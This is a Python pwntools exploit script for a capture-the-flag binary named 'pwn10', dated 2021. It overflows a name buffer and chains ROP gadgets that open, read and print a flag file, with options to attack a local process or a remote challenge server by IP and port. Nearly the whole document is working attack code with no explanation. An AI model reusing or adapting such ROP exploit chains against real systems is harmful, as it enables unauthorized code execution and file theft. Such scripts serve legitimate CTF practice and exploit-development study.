# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
context.log_level = 'debug' 
# context.update( os = 'linux', arch = 'amd64',timeout = 1)
binary = './pwn10'
os.system('chmod +x %s'%binary)
elf = ELF(binary)
libc = elf.libc
# libc = ELF('')
context.binary = binary
DEBUG = 1
if DEBUG:
    p = process(binary)
    libc = elf.libc
    # p = process(['qemu-arm', binary])
    # p = process(['qemu-arm', binary,'-g','1234'])
    # p = process(['qemu-aarch64','-L','','-g','1234',binary])
else:
    host = '183.129.189.60'
    port = '10016'
    p = remote(host,port)

l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': 0x%x' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda x = 12     : int( p.recv(x) , 16)

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def exhaust( pwn ):
    global p
    i = 0
    while 1 :
        try:
            i+=1
            pwn()
        except:
            lg('times ======== > ',i)
            p.close()
            if (DEBUG):
                p = process(binary)
            else :
                p = remote(host,port)

def one_gadget(filename):
    log.progress('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(
        ['one_gadget','--raw', '-f',filename]
    )).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla('>',num)

read_addr = 0x43F8A0
puts_addr = 0x40FF50
name_addr = 0x6CCD60
syscall = 0x43F90E
pop_rax_ret = 0x41f884
pop_rdi_ret = elf.search(asm('pop rdi;ret')).next()
pop_rsi_ret = elf.search(asm('pop rsi;ret')).next()
pop_rdx_ret = elf.search(asm('pop rdx;ret')).next()
leave_ret = elf.search(asm('leave;ret')).next()

lg('pop_rdi_ret',pop_rdi_ret)

flag_addr = name_addr + 0x73 -8

# dbg('*0x400AA3')
payload =  'a'*(0x73-8) + 'flag\x00' +  p64(flag_addr)
payload += flat(
    pop_rdi_ret , flag_addr , pop_rsi_ret , 0 , pop_rax_ret ,2 ,syscall,
    pop_rdi_ret ,3, pop_rsi_ret , flag_addr , pop_rdx_ret , 0x100 ,read_addr,
    pop_rdi_ret , flag_addr , puts_addr
)

sla('name', payload )


p.interactive()

'''
@File    :   pwn10.py
@Time    :   2021/10/11 15:51:05
@Author  :   Niyah 
'''